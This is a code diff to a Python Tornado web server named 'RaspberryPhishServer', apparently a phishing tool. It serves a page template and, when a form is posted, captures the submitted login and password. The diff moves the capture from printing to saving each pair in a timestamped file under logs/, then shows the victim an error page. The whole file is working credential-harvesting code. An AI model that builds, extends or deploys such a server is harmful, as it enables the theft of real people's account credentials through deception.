@@ -1,12 +1,15 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
-
 __title__ = "RaspberryPhishServer"
 
+# var : directory name where the server will load in "pages" and "rsc"
 pagePath = "test/"
+
 
 import tornado.ioloop
 import tornado.web
+import os.path
+import time
 
 
 # Handler for ressources
@@ -21,13 +24,23 @@ class MainHandler(tornado.web.RequestHandler):
         self.render("pages/" + pagePath + "index.html")
 
     def post(self):
-        # @TODO work with ids
         try:
-            print("login > " + self.get_argument("login"))
-            print("password > " + self.get_argument("password"))
+            login = self.get_argument("login")
+            password = self.get_argument("password")
+            name = time.time()
+            if os.path.isfile("logs/dump"+str(name)):
+                file = open("logs/dump"+str(name), mode="a")
+            else:
+                file = open("logs/dump"+str(name), mode="x")
+            file.write("login:" + login + "\npassword:" + password)
+            file.close()
         except tornado.web.HTTPError:
-            print("\n")
-        # @TODO reload the same page or an error one or something else ...
+            pass
+        except FileExistsError:
+            pass
+        except FileNotFoundError:
+            pass
+
         self.render("pages/" + pagePath + "error.html")
 
 
@@ -44,7 +57,7 @@ if __name__ == "__main__":
     )
 
     # bind a port
-    application.listen(80)
+    application.listen(8080)
 
     # loop forever for satisfy user's requests
     tornado.ioloop.IOLoop.instance().start()
